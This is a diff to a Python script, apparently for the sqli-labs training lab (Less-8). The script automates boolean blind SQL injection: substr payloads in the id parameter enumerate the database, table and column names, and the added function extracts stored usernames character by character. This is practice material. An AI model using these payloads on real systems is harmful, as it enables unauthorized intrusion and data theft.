@@ -5,9 +5,10 @@
 import requests
 
 
-# 盲注(bool型，时间型)
+# 盲注(bool型)
 # substr,ascii
 # sql注入爆数据库名长度，库名，表名，字段名
+# 默认不区分大小写，可以爆出忽略大小写字母数字组合的用户名密码
 
 def database_len():
     for i in range(1, 20):
@@ -29,7 +30,7 @@ def database_name():
         if flag:
             break
         flag = True
-        for i in 'sqcwertyuioplkjhgfdazxvbnm':
+        for i in 'sqcwertyuioplkjhgfdazxvbnm_':
             url = "http://192.168.255.151:8081/sqli-labs-master/Less-8/index.php?id=1' and substr(database(),%d,1)='%s'" % (
                 j, i)
             # print(url + '%23')
@@ -54,7 +55,7 @@ def table_name():
             if flag:
                 break
             flag = True
-            for i in 'sqcwertyuioplkjhgfdazxvbnm':
+            for i in 'sqcwertyuioplkjhgfdazxvbnm_':
                 url = "http://192.168.255.151:8081/sqli-labs-master/Less-8/index.php?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)='%s'" % (
                     k, j, i)
                 # print(url + '%23')
@@ -80,7 +81,7 @@ def column_name():
             if flag:
                 break
             flag = True
-            for i in 'sqcwertyuioplkjhgfdazxvbnm':
+            for i in 'sqcwertyuioplkjhgfdazxvbnm_':
                 url = "http://192.168.255.151:8081/sqli-labs-master/Less-8/index.php?id=1' and substr((select column_name from information_schema.columns where table_name='users' and table_schema='security' limit %d,1),%d,1)='%s'" % (
                     k, j, i)
                 # print(url + '%23')
@@ -92,6 +93,33 @@ def column_name():
                     print(name)
                     break
         print('column_name:', name)
+
+
+# 默认不区分大小写，可以爆出忽略大小写字母数字组合的用户名密码
+def field_name():
+    switch = False
+    for k in range(0, 19):
+        if switch:
+            break
+        switch = True
+        name = ''
+        flag = False
+        for j in range(1, 20):
+            if flag:
+                break
+            flag = True
+            for i in 'sqcwertyuioplkjhgfdazxvbnm_1234567890':
+                url = "http://192.168.255.151:8081/sqli-labs-master/Less-8/index.php?id=1' and substr((select username from security.users  limit %d,1),%d,1)='%s'" % (
+                    k, j, i)
+                # print(url + '%23')
+                r = requests.get(url + '%23')
+                if 'You are in' in r.text:
+                    flag = False
+                    switch = False
+                    name = name + i
+                    print(name)
+                    break
+        print('field_name:', name)
 
 
 # 联合查询:
@@ -152,4 +180,5 @@ database_len()
 database_name()
 table_name()
 column_name()
+field_name()
 # firsttable_name()
